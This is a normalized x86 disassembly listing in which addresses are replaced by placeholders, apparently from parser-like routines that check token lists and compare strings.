push 0x5f
push 0x0
push 0x60
push 0x7c
push 0x0
lea edx [ ebp - 0xc ]
push edx
push esi
call sub_1006d5b0
mov edi eax
lea eax [ ebp - 0xc ]
push eax
push esi
call sub_1005fce0
add esp 0x5c
mov eax edi
pop edi
pop esi
mov esp ebp
pop ebp
retn
lea edi [ ebp + 0xc ]
lea ecx [ ebp - 0xc ]
push ecx
push eax
push esi
call sub_100520a0
mov eax [ edi + 0x4 ]
add edi 0x4
add esp 0xc
cmp eax 0x96
jne r-xdata
sub_1006d7f0
push ebp
mov ebp esp
sub esp 0x10
push 0x96
push 0x1e
push 0x1d
push 0x2
push 0x5e
push 0x5d
push 0x5b
push 0x58
push 0x57
push 0x56
push 0x55
push 0x54
push 0x4a
push 0x90
push 0x68
push 0x67
push 0x5f
push 0x0
push 0x60
mov [ ebp - 0x4 ] eax
push 0x7c
mov eax 0x1
push 0x0
lea edx [ ebp - 0x10 ]
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0x8 ]
push edx
lea ecx [ ebp - 0x4 ]
push eax
mov [ ebp - 0x10 ] ecx
call sub_1006d5b0
add esp 0x5c
mov esp ebp
pop ebp
retn
sub_1006d850
push ebp
mov ebp esp
sub esp 0x10
push 0x96
push 0x6e
push 0x2
push 0x5e
push 0x5d
push 0x5b
push 0x58
push 0x57
push 0x56
push 0x55
push 0x54
push 0x4a
push 0x90
push 0x68
push 0x67
push 0x5f
push 0x0
push 0x60
mov [ ebp - 0x4 ] eax
push 0x7c
mov eax 0x1
push 0x0
lea edx [ ebp - 0x10 ]
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0x8 ]
push edx
lea ecx [ ebp - 0x4 ]
push eax
mov [ ebp - 0x10 ] ecx
call sub_1006d5b0
add esp 0x58
mov esp ebp
pop ebp
retn
sub_1006d8b0
push ebp
mov ebp esp
sub esp 0x10
push 0x96
push 0x5f
mov [ ebp - 0x4 ] eax
push 0x0
mov eax 0x1
push 0x0
lea edx [ ebp - 0x10 ]
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0x8 ]
push edx
lea ecx [ ebp - 0x4 ]
push eax
mov [ ebp - 0x10 ] ecx
call sub_1006d5b0
add esp 0x18
mov esp ebp
pop ebp
retn
sub_1006d8f0
push ebp
mov ebp esp
sub esp 0x10
push 0x96
push 0x72
mov [ ebp - 0x4 ] eax
mov eax 0x1
push 0x71
push eax
lea edx [ ebp - 0x10 ]
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0x8 ]
push edx
lea ecx [ ebp - 0x4 ]
push eax
mov [ ebp - 0x10 ] ecx
call sub_1006d5b0
add esp 0x18
mov esp ebp
pop ebp
retn
sub_1006d930
push 0x96
push 0x3d
push 0x3e
push 0x19
push 0x71
push 0x72
push 0x1f
push 0x21
push 0x22
mov eax esi
call sub_1006c550
push eax
call sub_1006c860
add esp 0x28
test eax eax
je r-xdata
retn
lea esp [ esp ]
mov eax esi
call sub_1006cc00
push 0x96
push 0x3d
push 0x3e
push 0x19
push 0x71
push 0x72
push 0x1f
push 0x21
push 0x22
mov eax esi
call sub_1006c550
push eax
call sub_1006c860
add esp 0x28
test eax eax
jne r-xdata
push edi
mov eax esi
call sub_1006c550
call sub_1006c8b0
add esp 0x4
test eax eax
jne r-xdata
sub_1006d9b0
push ebp
mov ebp esp
sub esp 0x10
push 0x96
push 0x5f
push 0x0
push 0x0
lea ecx [ ebp - 0x10 ]
push ecx
lea eax [ ebp - 0x4 ]
push esi
mov [ ebp - 0x4 ] 0x5f
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0x1
mov [ ebp - 0x8 ] 0x1
call sub_1006d5b0
add esp 0x18
test eax eax
jne r-xdata
mov eax esi
call sub_1006cc00
cmp [ eax ] 0x1
jne r-xdata
mov esp ebp
pop ebp
retn
cmp [ eax + 0x1c ] 0x5f
jne r-xdata
mov eax esi
call sub_1006c5e0
mov eax 0x1
mov esp ebp
pop ebp
retn
sub_1006da20
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi ecx
mov edi 0x96
mov ebx eax
mov [ ebp - 0x4 ] 0x1
call sub_1006d930
mov eax [ esi + 0xc ]
mov ecx [ eax + 0xc ]
test ecx ecx
je r-xdata
cmp [ ecx ] 0x1
jne r-xdata
mov eax [ eax + 0x8 ]
mov ecx [ eax + ecx * 4 - 0x4 ]
mov eax [ ebp + 0x8 ]
push esi
call sub_1006c750
add esp 0x4
mov [ ebp - 0x4 ] 0x0
lea ebx [ ebx ]
cmp [ ecx + 0x1c ] ebx
je r-xdata
mov eax esi
call sub_1006cc00
cmp [ eax ] 0x1
jne r-xdata
cmp [ eax + 0x1c ] ebx
jne r-xdata
mov edi [ esi + 0xc ]
add edi 0x14
xor ebx ebx
lea esp [ esp ]
push ebx
push r--data
call sub_1001f980
mov ecx [ esi + 0xc ]
mov eax [ ebp - 0x4 ]
add esp 0x8
pop edi
pop esi
mov [ ecx ] 0xd
pop ebx
mov esp ebp
pop ebp
retn
cmp eax r--data
jne r-xdata
push edi
push esi
call sub_10053700
add esp 0x8
inc ebx
test eax eax
je r-xdata
sub_1006dad0
push ebp
mov ebp esp
sub esp 0x10
push 0x96
push 0x5f
push 0x0
lea eax [ ebp - 0x4 ]
push 0x0
lea ecx [ ebp - 0x10 ]
mov [ ebp - 0x10 ] eax
mov eax 0x1
push ecx
push esi
mov [ ebp - 0x4 ] 0x67
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] eax
call sub_1006d5b0
add esp 0x18
test eax eax
push edi
mov ecx esi
mov eax 0x67
jne r-xdata
call sub_1006da20
add esp 0x4
mov esp ebp
pop ebp
retn
mov eax 0x68
sub_1006db50
mov eax [ ecx + 0x20 ]
sub eax 0x0
je r-xdata
push 0x96
push 0x85
push 0x43
push 0x1e
push 0x66
push 0x2
push 0x64
push 0x68
push 0x65
push 0x73
push 0x67
push 0x63
push 0x5f
push 0x79
push 0x6
push 0x6f
push 0xc
push 0x7
push 0x1b
push 0x88
push 0x4b
push 0x19
push 0x1d
push 0x4a
push 0x8
push 0x82
push 0x87
push 0xd
push 0x5
push 0x7a
push 0x90
push 0x84
push 0x4
push 0x1f
push 0x83
push 0x6d
push 0x47
push 0x48
push 0x0
push 0x1a
push 0x15
push 0x16
push 0x1
push 0x14
push 0x13
push 0x12
push 0x11
push 0x10
push 0xf
push 0x81
push 0x80
push 0x69
push 0x17
push 0x23
push 0x24
push 0x6a
push 0x49
push 0x21
push 0x20
push 0x26
push 0x7f
push 0x78
push 0x22
push 0x7b
push 0x61
push 0x62
push 0x8e
push 0x60
push 0x6e
push 0x42
push 0xa
push 0x1c
push 0x7e
push 0x8b
push 0x3
push 0xe
push 0xb
push 0x52
push 0x7c
push 0x18
push ecx
call sub_1006c860
add esp 0x144
retn
dec eax
je r-xdata
push 0x96
push 0x5e
push 0x5d
push ecx
call sub_1006c860
add esp 0x10
retn
dec eax
je r-xdata
push 0x96
push 0x5b
push 0x58
push 0x57
push 0x56
push 0x55
push 0x54
push ecx
call sub_1006c860
add esp 0x20
retn
call sub_1000967a
sub_1006dc70
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi eax
mov esi ecx
mov ebx 0x1
call sub_1006d930
mov eax [ esi + 0xc ]
mov ecx [ eax + 0xc ]
test ecx ecx
je r-xdata
cmp [ ecx ] ebx
jne r-xdata
mov eax [ eax + 0x8 ]
mov ecx [ eax + ecx * 4 - 0x4 ]
mov eax [ ebp + 0x8 ]
push esi
call sub_1006c750
add esp 0x4
push edi
mov eax esi
call sub_1006c550
call sub_1006c8b0
add esp 0x4
test eax eax
jne r-xdata
cmp [ ecx + 0x1c ] edi
je r-xdata
xor ebx ebx
mov edi edi
mov eax esi
call sub_1006cc00
pop edi
pop esi
mov eax ebx
pop ebx
pop ebp
retn
mov eax esi
call sub_1006cc00
push edi
mov eax esi
call sub_1006c550
call sub_1006c8b0
add esp 0x4
test eax eax
je r-xdata
sub_1006dcf0
push ebp
mov ebp esp
sub esp 0x10
push 0x96
push 0x6e
push 0x2
push 0x5e
push 0x5d
push 0x5b
push 0x58
push 0x57
push 0x56
push 0x55
push 0x54
push 0x4a
push 0x90
push 0x68
push 0x67
push 0x5f
push 0x0
push 0x60
push 0x7c
push 0x0
lea ecx [ ebp - 0x10 ]
push ecx
lea eax [ ebp - 0x4 ]
push esi
mov [ ebp - 0x4 ] 0x19
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0x1
mov [ ebp - 0x8 ] 0x1
call sub_1006d5b0
add esp 0x58
test eax eax
je r-xdata
mov eax 0x1
mov esp ebp
pop ebp
retn
mov edx [ ebp + 0x8 ]
push edx
mov eax 0x19
mov ecx esi
call sub_1006dc70
add esp 0x4
mov esp ebp
pop ebp
retn
sub_1006dd70
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push ebx
mov ebx [ eax + 0xc ]
push edi
mov edi [ ebx + 0xc ]
dec edi
mov [ ebx + 0x3c ] 0x0
js r-xdata
pop edi
pop ebx
pop ebp
retn
push esi
lea esp [ esp ]
push 0x96
push 0x21
push 0x22
push esi
call sub_1006c860
add esp 0x10
test eax eax
jne r-xdata
cmp [ esi ] 0x1
jne r-xdata
mov edx [ ebp + 0xc ]
mov eax [ esi + 0x1c ]
mov ecx [ ebp + 0x8 ]
push edx
call sub_1006dc70
add esp 0x4
mov ecx esi
call sub_1006db50
test eax eax
je r-xdata
cmp [ esi + 0x1c ] 0x1f
jne r-xdata
dec edi
jns r-xdata
push 0x96
push 0x19
push 0x26
push 0x18
push esi
call sub_1006c860
add esp 0x14
test eax eax
je r-xdata
cmp [ ebp + 0x10 ] 0x0
mov ecx [ ebx + 0x8 ]
mov esi [ ecx + edi * 4 ]
je r-xdata
pop esi
pop edi
pop ebx
pop ebp
retn
pop esi
sub_1006de00
push ebp
mov ebp esp
push ecx
push esi
add eax 0x4c
xor esi esi
mov [ ebp - 0x4 ] eax
cmp [ edi + 0x20 ] esi
jbe r-xdata
mov ecx [ ebp + 0x8 ]
push edi
push ecx
call sub_1001bee0
add esp 0x8
pop esi
mov esp ebp
pop ebp
retn
push ebx
inc esi
cmp esi [ edi + 0x20 ]
jb r-xdata
mov ecx [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
push ecx
push ebx
push edx
call sub_100520a0
mov eax [ edi + 0x1c ]
add esp 0xc
mov [ eax + esi * 4 ] 0x0
mov ecx [ edi + 0x1c ]
mov ebx [ ecx + esi * 4 ]
mov edx [ ebx + 0x4 ]
mov eax [ ebp - 0x4 ]
push edx
push eax
call sub_1002e6f0
add esp 0x8
test eax eax
jne r-xdata
pop ebx
sub_1006de70
push ebp
mov ebp esp
push ecx
push ebx
push esi
add eax 0x1c
push edi
mov [ ebp - 0x4 ] eax
mov edi rw-data
mov ebx 0xc
add edi 0xc
dec ebx
jne r-xdata
mov eax [ esi + 0x4 ]
mov ecx [ ebp + 0x8 ]
push eax
push ecx
call sub_10030ff0
mov edx [ edi + 0x4 ]
mov ecx [ ebp + 0x8 ]
mov [ esi ] edx
mov eax [ edi ]
push eax
push ecx
call sub_1002bb60
add esp 0x10
mov [ esi + 0x4 ] eax
mov ecx [ edi - 0x4 ]
mov edx [ ebp - 0x4 ]
push ecx
push edx
call sub_1002e6f0
mov esi eax
add esp 0x8
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_1006ded0
push ebp
mov ebp esp
push ebx
push esi
push edi
lea ebx [ eax + 0x1c ]
xor esi esi
jmp r-xdata
mov eax [ esi + rw-data ]
push eax
push ebx
call sub_1002e6f0
mov edi eax
add esp 0x8
test edi edi
je r-xdata
add esi 0x10
cmp esi 0x3e0
jb r-xdata
mov ecx [ edi + 0x4 ]
mov edx [ ebp + 0x8 ]
push ecx
push edx
call sub_10030ff0
mov eax [ esi + rw-data ]
mov ecx [ ebp + 0x8 ]
push eax
push ecx
call sub_1002bb60
add esp 0x10
mov [ edi + 0x4 ] eax
pop edi
pop esi
pop ebx
pop ebp
retn
sub_1006df30
push esi
add eax 0x1c
push r--data
push eax
call sub_1002e6f0
mov esi eax
add esp 0x8
test esi esi
je r-xdata
pop esi
retn
mov ecx [ esi + 0x4 ]
push ecx
push edi
call sub_10030ff0
push r--data
push edi
call sub_1002bb60
add esp 0x10
mov [ esi + 0x4 ] eax
sub_1006df70
push ebp
mov ebp esp
mov ecx [ eax ]
mov eax [ esi + 0x4 ]
sbb eax eax
sbb eax 0xffffffff
test dl dl
je r-xdata
xor eax eax
pop ebp
retn
cmp [ ebp + 0xc ] eax
jne r-xdata
xor eax eax
jmp r-xdata
mov dl [ eax + 0x1 ]
cmp dl [ ecx + 0x1 ]
jne r-xdata
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx ]
mov eax [ esi + 0x8 ]
cmp [ esi + 0x14 ] eax
je r-xdata
test eax eax
jne r-xdata
add eax 0x2
add ecx 0x2
test dl dl
jne r-xdata
sbb eax eax
sbb eax 0xffffffff
test dl dl
je r-xdata
mov dl [ eax ]
cmp dl [ ecx ]
jne r-xdata
mov eax 0x1
pop ebp
retn
xor eax eax
jmp r-xdata
mov dl [ eax + 0x1 ]
cmp dl [ ecx + 0x1 ]
jne r-xdata
test eax eax
jne r-xdata
add eax 0x2
add ecx 0x2
test dl dl
jne r-xdata
mov dl [ eax ]
cmp dl [ ecx ]
jne r-xdata
sub_1006dff0
push ebp
mov ebp esp
mov eax [ ebx + 0x18 ]
push esi
lea esi [ ebx + 0x18 ]
push edi
mov ecx r--data
sbb eax eax
sbb eax 0xffffffff
test dl dl
je r-xdata
mov edx [ ebp + 0x8 ]
push edx
mov eax ebx
call sub_1006c750
add esp 0x4
pop edi
xor eax eax
pop esi
pop ebp
retn
cmp [ esi + 0x10 ] 0x0
jne r-xdata
xor eax eax
jmp r-xdata
mov dl [ eax + 0x1 ]
cmp dl [ ecx + 0x1 ]
jne r-xdata
mov edi [ esi + 0x4 ]
mov ecx [ r--data ]
mov eax edi
cmp [ esi + 0x14 ] 0x0
je r-xdata
xor ecx ecx
test eax eax
sete cl
mov eax ecx
test eax eax
je r-xdata
add eax 0x2
add ecx 0x2
test dl dl
jne r-xdata
sbb eax eax
sbb eax 0xffffffff
test dl dl
je r-xdata
pop edi
mov eax 0x1
pop esi
pop ebp
retn
mov eax [ esi + 0x8 ]
mov ecx r--data
mov edi edi
mov dl [ eax ]
cmp dl [ ecx ]
jne r-xdata
mov ecx [ r--data ]
mov eax edi
mov ecx [ r--data ]
mov eax [ esi + 0x8 ]
lea ebx [ ebx ]
xor eax eax
jmp r-xdata
mov dl [ eax + 0x1 ]
cmp dl [ ecx + 0x1 ]
jne r-xdata
sbb eax eax
sbb eax 0xffffffff
test dl dl
je r-xdata
sbb eax eax
sbb eax 0xffffffff
test dl dl
je r-xdata
sbb eax eax
sbb eax 0xffffffff
test dl dl
je r-xdata
test eax eax
jne r-xdata
add eax 0x2
add ecx 0x2
test dl dl
jne r-xdata
xor eax eax
jmp r-xdata
mov dl [ eax + 0x1 ]
cmp dl [ ecx + 0x1 ]
jne r-xdata
push 0x0
push r--data
mov eax r--data
call sub_1006df70
add esp 0x8
test eax eax
jne r-xdata
mov ecx [ r--data ]
mov eax [ esi + 0x8 ]
xor eax eax
jmp r-xdata
mov dl [ eax + 0x1 ]
cmp dl [ ecx + 0x1 ]
jne r-xdata
xor eax eax
jmp r-xdata
mov dl [ eax + 0x1 ]
cmp dl [ ecx + 0x1 ]
jne r-xdata
mov dl [ eax ]
cmp dl [ ecx ]
jne r-xdata
test eax eax
jne r-xdata
add eax 0x2
add ecx 0x2
test dl dl
jne r-xdata
push eax
push r--data
mov eax r--data
call sub_1006df70
add esp 0x8
test eax eax
je r-xdata
sbb eax eax
sbb eax 0xffffffff
test dl dl
je r-xdata
test eax eax
jne r-xdata
add eax 0x2
add ecx 0x2
test dl dl
jne r-xdata
test eax eax
je r-xdata
add eax 0x2
add ecx 0x2
test dl dl
jne r-xdata
mov dl [ eax ]
cmp dl [ ecx ]
jne r-xdata
xor eax eax
jmp r-xdata
mov dl [ eax + 0x1 ]
cmp dl [ ecx + 0x1 ]
jne r-xdata
mov dl [ eax ]
cmp dl [ ecx ]
jne r-xdata
mov dl [ eax ]
cmp dl [ ecx ]
jne r-xdata
test eax eax
je r-xdata
add eax 0x2
add ecx 0x2
test dl dl
jne r-xdata
mov dl [ eax ]
cmp dl [ ecx ]
jne r-xdata
sub_1006e1a0
push ebp
mov ebp esp
sub esp 0x3c
mov eax [ ebp + 0x8 ]
push ebx
push esi
push edi
mov edi [ eax + 0xc ]
push r--data
mov [ ebp - 0x4 ] edi
call sub_1001f980
add esp 0x4
mov [ ebp - 0x20 ] 0x0
push r--data
call sub_1001f980
add esp 0x4
pop edi
pop esi
xor eax eax
pop ebx
mov esp ebp
pop ebp
retn
mov ecx [ edi + 0x14 ]
lea ecx [ ecx + eax * 4 ]
push r--data
call sub_1001f980
add esp 0x4
pop edi
pop esi
xor eax eax
pop ebx
mov esp ebp
pop ebp
retn
cmp [ ebx ] 0x1
jne r-xdata
sub ecx 0x4
dec eax
jns r-xdata
mov edx [ ebp + 0x10 ]
cmp [ ebx + 0x1c ] edx
je r-xdata
mov ebx [ ecx ]
mov [ ebp - 0x1c ] ebx
cmp ebx r--data
je r-xdata
add edi 0x8
push ebx
push edi
call sub_1001b8a0
mov esi eax
mov eax [ ebp + 0x10 ]
add esp 0x8
push esi
push eax
call sub_1003b570
add esp 0x4
push eax
push r--data
call sub_1001f980
add esp 0xc
cmp esi 0xffffffff
je r-xdata
push r--data
call sub_1001f980
mov eax [ ebp - 0x4 ]
mov ecx [ ebp + 0x8 ]
add eax 0x14
push eax
push ebx
push ecx
call sub_10038c10
add esp 0x10
pop edi
pop esi
xor eax eax
pop ebx
mov esp ebp
pop ebp
retn
push 0x96
push 0x2
push 0x5e
push 0x5d
push 0x5b
push 0x58
push 0x57
mov ecx [ ebx + 0x1c ]
push 0x56
push 0x55
push 0x54
push 0x4a
push 0x90
push 0x68
push 0x67
push 0x5f
push 0x0
push 0x60
mov eax 0x1
push 0x7c
mov [ ebp - 0x38 ] eax
mov [ ebp - 0x34 ] eax
push 0x0
lea eax [ ebp - 0x3c ]
mov [ ebp - 0x18 ] ecx
mov ecx [ ebp + 0x8 ]
push eax
lea edx [ ebp - 0x18 ]
push ecx
mov [ ebp - 0x3c ] edx
call sub_1006d5b0
add esp 0x54
test eax eax
je r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ ebp + 0xc ]
push edx
call sub_1006c750
push r--data
call sub_1001f980
add esp 0x8
pop edi
pop esi
xor eax eax
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp + 0x8 ]
call sub_1006c550
cmp ebx eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x8 ] esi
cmp esi [ eax + 0xc ]
jae r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ ebp + 0xc ]
push edx
call sub_1006c750
add esp 0x4
mov esi [ ebp + 0x8 ]
mov eax esi
call sub_1006c550
cmp eax ebx
je r-xdata
mov ecx [ edi ]
mov edx [ ebp - 0x8 ]
mov esi [ ecx + edx * 4 ]
mov ecx esi
mov [ ebp - 0xc ] esi
call sub_1006db50
test eax eax
jne r-xdata
mov eax esi
call sub_1006cc00
mov edx [ ebp - 0x4 ]
add edx 0x14
push edx
push ebx
push esi
call sub_10038c10
add esp 0xc
pop edi
pop esi
xor eax eax
pop ebx
mov esp ebp
pop ebp
retn
mov eax esi
call sub_1006cc00
mov eax esi
call sub_1006c550
cmp eax ebx
jne r-xdata
test esi esi
je r-xdata
mov eax [ ebp - 0x8 ]
mov ecx [ ebp - 0x4 ]
inc eax
mov [ ebp - 0x8 ] eax
cmp eax [ ecx + 0xc ]
jb r-xdata
push ebx
push edi
call sub_1001b8a0
mov edx [ edi ]
mov ecx [ esi + 0x1c ]
mov eax [ edx + eax * 4 - 0x4 ]
push ecx
mov [ ebp - 0x18 ] eax
call sub_1003b570
mov edx [ ebp - 0x18 ]
add esp 0xc
push eax
mov eax [ edx + 0x1c ]
push eax
call sub_1003b570
add esp 0x4
push eax
push r--data
call sub_1001f980
mov eax [ ebp - 0x4 ]
add eax 0x14
push ebx
push eax
call sub_1001b8a0
push esi
push edi
mov [ ebp - 0x8 ] eax
mov ebx esi
call sub_1001b8a0
add esp 0x1c
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x14 ] 0x0
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x8 ]
mov esi [ ecx + edi * 4 - 0x4 ]
dec edi
add eax 0x14
push esi
push eax
mov [ ebp - 0x10 ] edi
call sub_1001b8a0
add esp 0x8
cmp eax 0xffffffff
jne r-xdata
mov edi esi
cmp esi [ ebp - 0x1c ]
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
add eax 0x8
push eax
push edi
push edx
call sub_10015200
jmp r-xdata
mov ecx [ ebx + 0x1c ]
push ecx
call sub_1003b570
push eax
push r--data
call sub_1001f980
mov esi [ ebx + 0x4 ]
add esp 0xc
test esi esi
je r-xdata
mov eax [ ebp - 0x4 ]
add eax 0x14
push esi
push eax
call sub_1001b8a0
push 0x100
mov [ ebp - 0x24 ] eax
mov eax [ ebp + 0x8 ]
push esi
push eax
call sub_100283e0
mov ecx [ ebp - 0x24 ]
mov esi eax
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x14 ]
mov [ edx + ecx * 4 ] esi
mov eax [ eax + 0x8 ]
add esp 0x14
mov [ eax + edi * 4 ] esi
cmp ebx [ ebp - 0xc ]
jne r-xdata
mov eax [ ebp - 0x14 ]
inc eax
add esp 0xc
mov [ ebp - 0x14 ] eax
cmp eax 0x3
jl r-xdata
mov edi [ ebp + 0x8 ]
add esi 0x10
push ebx
push esi
call sub_1001b8a0
mov edi [ ebp + 0x8 ]
push esi
push eax
push edi
mov [ ebp - 0x24 ] eax
call sub_10015200
mov eax [ ebp - 0x24 ]
add esp 0x14
mov [ ebx + 0x4 ] 0x0
mov [ ebx + 0x8 ] 0xffffffff
cmp eax [ esi + 0x4 ]
jae r-xdata
mov edi [ ebx + 0x4 ]
or [ ebx + 0xc ] 0x200
test edi edi
je r-xdata
inc ecx
mov [ ebp - 0x8 ] ecx
mov eax [ ebp - 0x4 ]
add eax 0x8
push esi
push eax
call sub_1001b8a0
mov esi [ ebp - 0x10 ]
mov edi eax
push esi
push edi
push r--data
call sub_1001f980
add esp 0x14
cmp edi 0xffffffff
jne r-xdata
mov edx [ esi + 0x1c ]
push edx
call sub_1003b570
push eax
push r--data
call sub_1001f980
add esp 0xc
lea eax [ esi + 0x10 ]
push eax
mov [ ebx + 0x4 ] esi
mov ecx [ eax + 0x4 ]
push ebx
push edi
mov [ ebx + 0x8 ] ecx
call sub_100520a0
add esp 0xc
push r--data
call sub_1001f980
push edi
call sub_1006c990
add esp 0x8
jmp r-xdata
mov esi [ ebp - 0x18 ]
or [ ebx + 0xc ] 0x200
push 0x96
push 0x66
push 0x64
push 0x65
push 0x63
push 0x5f
push esi
call sub_1006c860
add esp 0x1c
test eax eax
je r-xdata
lea esp [ esp ]
lea eax [ esi + 0x10 ]
push eax
mov [ ebx + 0x4 ] esi
mov edx [ eax + 0x4 ]
mov eax [ ebp + 0x8 ]
push ebx
push eax
mov [ ebx + 0x8 ] edx
call sub_100520a0
mov ebx esi
add edi 0x10
push ebx
push edi
call sub_1001b8a0
mov ecx [ ebp + 0x8 ]
push edi
push eax
push ecx
mov [ ebp - 0x24 ] eax
call sub_10015200
mov eax [ ebp - 0x24 ]
add esp 0x14
mov [ ebx + 0x4 ] 0x0
mov [ ebx + 0x8 ] 0xffffffff
cmp eax [ edi + 0x4 ]
jae r-xdata
mov ecx [ ebp - 0xc ]
push eax
mov [ esi + 0x4 ] ecx
mov edx [ eax + 0x4 ]
push esi
push edi
mov [ esi + 0x8 ] edx
call sub_100520a0
mov eax [ ebp - 0x4 ]
add eax 0x14
push ebx
push eax
mov [ ebp - 0x1c ] eax
call sub_1001b8a0
add esp 0x14
cmp eax [ ebp - 0x8 ]
jge r-xdata
mov edx [ ebp - 0x30 ]
mov edx [ edx + ecx * 4 ]
inc ecx
mov [ edx + 0x4 ] esi
cmp ecx [ ebp - 0x2c ]
jb r-xdata
mov ebx [ ebp - 0x1c ]
push 0x100
push ebx
push edi
call sub_100283e0
or [ ebx + 0xc ] 0x2
mov esi eax
mov eax [ esi + 0x18 ]
mov edx [ esi + 0x14 ]
mov ecx [ esi + 0x10 ]
mov [ ebp - 0x28 ] eax
mov eax [ ebp - 0xc ]
add eax 0x10
mov [ ebp - 0x2c ] edx
mov edx [ eax ]
mov [ esi + 0x10 ] edx
mov edx [ eax + 0x4 ]
mov [ esi + 0x14 ] edx
mov edx [ eax + 0x8 ]
mov [ esi + 0x18 ] edx
mov edx [ ebp - 0x28 ]
mov [ eax ] ecx
mov ecx [ ebp - 0x2c ]
mov [ eax + 0x4 ] ecx
mov [ eax + 0x8 ] edx
mov ecx [ esi + 0x10 ]
mov edx [ esi + 0x14 ]
mov [ ebp - 0x30 ] ecx
mov ecx [ esi + 0x18 ]
mov [ ebp - 0x28 ] ecx
add esp 0xc
xor ecx ecx
mov [ ebp - 0x2c ] edx
test edx edx
je r-xdata
mov edx [ esi ]
mov ecx [ edx + eax * 4 ]
mov [ ecx + 0x8 ] eax
inc eax
cmp eax [ esi + 0x4 ]
jb r-xdata
jmp r-xdata
lea esp [ esp ]
mov ecx [ ebp - 0x1c ]
push ecx
push eax
push edi
call sub_10015200
mov edx [ ebp - 0x1c ]
mov eax [ ebp - 0x8 ]
push edx
push eax
push esi
push edi
call sub_10068ab0
mov eax [ ebp - 0x4 ]
add eax 0x8
push eax
push ebx
push edi
mov [ ebp - 0x24 ] eax
call sub_10038c10
mov ecx [ ebp - 0xc ]
mov ebx [ ebp - 0x24 ]
push ecx
push ebx
call sub_1001b8a0
push ebx
inc eax
push eax
push esi
push edi
call sub_10068ab0
mov eax [ ebp - 0x20 ]
inc eax
add esp 0x40
mov [ ebp - 0x20 ] eax
cmp eax 0x8
jge r-xdata
dec [ ebp - 0x8 ]
mov edx [ edi ]
mov ecx [ edx + eax * 4 ]
mov [ ecx + 0x8 ] eax
inc eax
cmp eax [ edi + 0x4 ]
jb r-xdata
pop edi
pop esi
mov eax 0x1
pop ebx
mov esp ebp
pop ebp
retn
mov edi [ ebp - 0x4 ]
jmp r-xdata
mov eax [ edi + 0x18 ]
dec eax
js r-xdata
sub_1006e6f0
push esi
push edi
mov edi eax
call sub_1006caa0
mov esi [ edi + 0xc ]
mov eax edi
call sub_1006cc00
test eax eax
je r-xdata
mov eax edi
call sub_1006cc00
test eax eax
jne r-xdata
cmp [ eax ] 0x1
jne r-xdata
pop edi
pop esi
retn
or [ eax + 0xc ] 0x2
mov ecx [ eax + 0x1c ]
cmp ecx 0xa
jne r-xdata
test ecx ecx
jne r-xdata
cmp [ esi + 0x6c ] 0x0
jne r-xdata
cmp [ esi + 0x70 ] ecx
jne r-xdata
mov eax edi
call sub_1006cc00
test eax eax
jne r-xdata
sub_1006e740
push ebp
mov ebp esp
push ebx
push edi
mov edi [ ebp + 0x8 ]
mov eax [ edi + 0x4 ]
mov ebx [ eax ]
mov eax [ ebp + 0xc ]
mov ecx [ eax ]
cmp ecx 0x4
jne r-xdata
push esi
cmp ecx 0x3
jne r-xdata
mov ecx [ edi + 0xc ]
mov edx [ ecx + 0x68 ]
push edx
push edi
call sub_1001bee0
add esp 0x8
pop edi
mov eax 0x1
pop ebx
pop ebp
retn
test ecx ecx
jne r-xdata
mov esi eax
mov eax edi
call sub_1006cce0
pop esi
pop edi
mov eax 0x1
pop ebx
pop ebp
retn
push edi
call sub_1006c750
mov eax 0x1
mov [ ebx + 0x2c ] eax
mov edx [ edi + 0xc ]
add esp 0x4
mov [ edx ] eax
mov ecx [ edi + 0xc ]
pop esi
pop edi
mov [ ecx + 0x34 ] eax
pop ebx
pop ebp
retn
mov [ ebx + 0x1c ] 0x1
mov ecx [ eax + 0x18 ]
lea esi [ eax + 0x18 ]
mov [ ebx + 0x20 ] ecx
mov edx [ eax + 0x1c ]
mov [ ebx + 0x24 ] edx
mov eax [ eax + 0x20 ]
mov [ ebx + 0x28 ] eax
call sub_1006d4e0
mov [ ebx + 0x2c ] eax
mov ecx [ edi + 0xc ]
mov ebx [ ebp + 0xc ]
push edi
mov [ ecx ] 0x1
call sub_1006dff0
add esp 0x4
pop esi
pop edi
pop ebx
pop ebp
retn
sub_1006e7f0
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0xc ]
mov eax [ esi ]
push edi
test eax eax
jne r-xdata
push ebx
cmp eax 0x3
jne r-xdata
mov edi [ ebp + 0x8 ]
push edi
mov eax esi
call sub_1006c750
mov eax [ edi + 0xc ]
mov ecx [ eax + 0x68 ]
push ecx
push edi
call sub_1001bee0
add esp 0xc
pop edi
xor eax eax
pop esi
pop ebp
retn
cmp eax 0x4
jne r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ eax + 0x4 ]
mov ebx [ edx ]
call sub_1006cce0
pop ebx
pop edi
mov eax 0x1
pop esi
pop ebp
retn
cmp eax 0x1
jne r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0xc ]
mov edx [ ecx + 0x68 ]
push edx
push eax
call sub_1001bee0
add esp 0x8
pop ebx
pop edi
mov eax 0x1
pop esi
pop ebp
retn
cmp eax 0x2
jne r-xdata
xor ecx ecx
cmp [ esi + 0x18 ] ecx
sete cl
test ecx ecx
